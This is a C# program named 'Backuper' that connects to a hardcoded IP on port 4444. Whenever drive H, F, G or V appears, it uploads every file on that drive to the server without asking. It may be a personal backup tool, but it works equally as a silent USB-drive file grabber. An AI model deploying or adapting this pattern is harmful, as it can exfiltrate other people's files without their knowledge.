using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Threading;
using UnityNetwork;
using UnityNetwork.Client;

namespace Backuper
{
    class Program : ClientListenTCP
    {
        ClientLinkerTCP Client;
        bool link;
        bool ReLink = false;
        string drive = "HFGV";
        StringBuilder stringBuilder;
        const int runSpeed = 1048576;
        Dictionary<int, Dictionary<byte, object>> thing;
        List<int> packetID;
        public Program()
        {
            if (File.Exists("drive.txt"))
            {
                drive = File.ReadAllText("drive.txt");
            }
            else
            {
                File.AppendAllText("drive.txt", drive);
            }
            stringBuilder = new StringBuilder();
            Client = new ClientLinkerTCP(this);
            thing = new Dictionary<int, Dictionary<byte, object>>();
            packetID = new List<int>();
            link = false;
        }
        static void Main(string[] args)
        {
            new Program().run();
        }
        public void run()
        {
            if (Client.Connect("59.127.53.197", 4444))
            {
                do
                {
                    Client.Update(false);
                    if (link)
                    {
                        for (int i = 0; i < drive.Length; i++)
                        {
                            if (Directory.Exists(drive[i].ToString() + @":\") && !stringBuilder.ToString().Contains(drive[i].ToString()))
                            {
                                stringBuilder.Append(drive[i].ToString());
                                Console.WriteLine(" jj");
                                ThreadPool.QueueUserWorkItem(Copying, drive[i].ToString() + @":\");
                            }
                            else if (!Directory.Exists(drive[i].ToString() + @":\") && stringBuilder.ToString().Contains(drive[i].ToString()))
                            {
                                if (stringBuilder.ToString().IndexOf(drive[i]) >= 0)
                                {
                                    stringBuilder.Remove(stringBuilder.ToString().IndexOf(drive[i]), 1);
                                }
                            }
                        }
                    }
                    else
                    {
                        if (ReLink)
                        {
                            Client.Connect("59.127.53.197", 4444);
                            ReLink = false;
                        }
                    }
                    System.Threading.Thread.Sleep(100);
                }
                while (true);
            }
        }

        public void Copying(object _drive)
        {
            string[] filePaths = Directory.GetFiles(_drive.ToString(), "*.*", SearchOption.AllDirectories);
            for(int i = 0; i < filePaths.Length && link; i++)
            {
                while (true)
                {
                    try
                    {
                        if(!File.Exists(filePaths[i]))
                        {
                            break;
                        }
                        FileStream file = new FileStream(filePaths[i], FileMode.Open, FileAccess.Read);
                        int a = (int)(file.Length / runSpeed);
                        int b = (int)(file.Length % runSpeed);
                        for (int ii = 0; ii < a + 1 && link; ii++)
                        {
                            byte[] _byte;
                            try
                            {
                                if (ii == a)
                                {
                                    _byte = new byte[b];
                                    file.Read(_byte, 0, b);
                                }
                                else
                                {
                                    _byte = new byte[runSpeed];
                                    file.Read(_byte, 0, runSpeed);
                                }
                            }
                            catch(Exception)
                            {
                                Random random = new Random(Guid.NewGuid().GetHashCode());
                                int x = random.Next(0, 10000);
                                while (thing.ContainsKey(x))
                                {
                                    x = random.Next(0, 10000);
                                }
                                Dictionary<byte, object> keys = new Dictionary<byte, object> { { 0, _drive.ToString()[0].ToString() + " " + x }, { 1, filePaths[i] }, { 2, ii }, { 3, "" }, { 4, false }, { 5, 0 } };
                                while (true)
                                {
                                    try
                                    {
                                        thing.Add(x, keys);
                                        break;
                                    }
                                    catch (Exception)
                                    {

                                    }
                                }

                                packetID.Add(x);
                                Client.ask(1, keys);
                                List<string> t = new List<string>(filePaths);
                                t.Remove(filePaths[i]);
                                t.Add(filePaths[i]);
                                filePaths = t.ToArray();
                                i--;
                                break;
                            }
                            while (true)
                            {
                                try
                                {
                                    Random random = new Random(Guid.NewGuid().GetHashCode());
                                    int x = random.Next(0, 10000);
                                    while (thing.ContainsKey(x))
                                    {
                                        x = random.Next(0, 10000);
                                    }
                                    bool w = (i == filePaths.Length - 1 && ii == a);
                                    Dictionary<byte, object> keys = new Dictionary<byte, object> { { 0, _drive.ToString()[0].ToString() + " " + x }, { 1, filePaths[i] }, { 2, ii }, { 3, _byte }, { 4, ii == a }, { 5, _byte.Length } };
                                    while (true)
                                    {
                                        try
                                        {
                                            thing.Add(x, keys);
                                            break;
                                        }
                                        catch (Exception)
                                        {

                                        }
                                    }

                                    packetID.Add(x);
                                    Client.ask(1, keys);
                                    Thread.Sleep(100);
                                    break;
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.ToString());
                                }

                            }
                        }
                        file.Close();
                        break;
                    }
                    catch (Exception)
                    {
                        Random random = new Random(Guid.NewGuid().GetHashCode());
                        int x = random.Next(0, 10000);
                        while (thing.ContainsKey(x))
                        {
                            x = random.Next(0, 10000);
                        }
                        Dictionary<byte, object> keys = new Dictionary<byte, object> { { 0, _drive.ToString()[0].ToString() + " " + x }, { 1, filePaths[i] }, { 2, 0 }, { 3, "" }, { 4, false }, { 5, 0 } };
                        while (true)
                        {
                            try
                            {
                                thing.Add(x, keys);
                                break;
                            }
                            catch (Exception)
                            {

                            }
                        }

                        packetID.Add(x);
                        Client.ask(1, keys);
                        List<string> t = new List<string>(filePaths);
                        t.Remove(filePaths[i]);
                        t.Add(filePaths[i]);
                        filePaths = t.ToArray();
                    }
                }
            }
        }

        public void DebugReturn(string message)
        {
            Console.WriteLine("錯誤:" + message);
        }

        public void Loading(string message)
        {
            Console.WriteLine("Load:" + message);
        }

        public void OnEvent(Response response)
        {
            
        }

        public void OnOperationResponse(Response response)
        {
            switch(response.Code)
            {
                case 1:
                    {
                        Dictionary<byte, object> keys;
                        if(thing.TryGetValue(response.ReturnCode, out keys))
                        {
                            Client.ask(1, keys);
                        }
                        Console.WriteLine(response.ReturnCode + " " + response.DebugMessage);
                        break;
                    }
                case 2:
                    {
                        try
                        {
                            packetID.Remove(response.ReturnCode);
                        }
                        catch(Exception)
                        {

                        }
                        try
                        {
                            thing.Remove(response.ReturnCode);
                        }
                        catch(Exception)
                        {

                        }
                        Console.WriteLine(response.ReturnCode + " " + response.DebugMessage);
                        break;
                    }
                case 3:
                    {
                        for (int i = 0; i < packetID.Count; i++)
                        {
                            try
                            {
                                if(thing[packetID[i]][1].ToString() == response.Parameters[0].ToString() && Convert.ToInt32(thing[packetID[i]][2]) == Convert.ToInt32(response.Parameters[1]))
                                {
                                    Client.ask(1, thing[packetID[i]]);
                                }
                            }
                            catch(Exception)
                            {
                                try
                                {
                                    packetID.Remove(packetID[i]);
                                }
                                catch(Exception)
                                {

                                }
                            }
                        }
                        Console.WriteLine(response.ReturnCode + " " + response.DebugMessage);
                        break;
                    }
            }
        }

        public void OnStatusChanged(LinkCobe connect)
        {
            Console.WriteLine(connect.ToString());
            switch (connect)
            {
                case LinkCobe.Connect:
                    {
                        link = true;
                        Console.WriteLine("GetLink");
                        break;
                    }
                case LinkCobe.Lost:
                    {
                        link = false;
                        ReLink = true;
                        Console.WriteLine("LinkLost");
                        stringBuilder = null;
                        stringBuilder = new StringBuilder();
                        thing.Clear();
                        packetID.Clear();
                        break;
                    }
                case LinkCobe.Failed:
                    {
                        link = false;
                        ReLink = true;
                        Console.WriteLine("LinkFailed");
                        stringBuilder = null;
                        stringBuilder = new StringBuilder();
                        thing.Clear();
                        packetID.Clear();
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
        }
    }
}
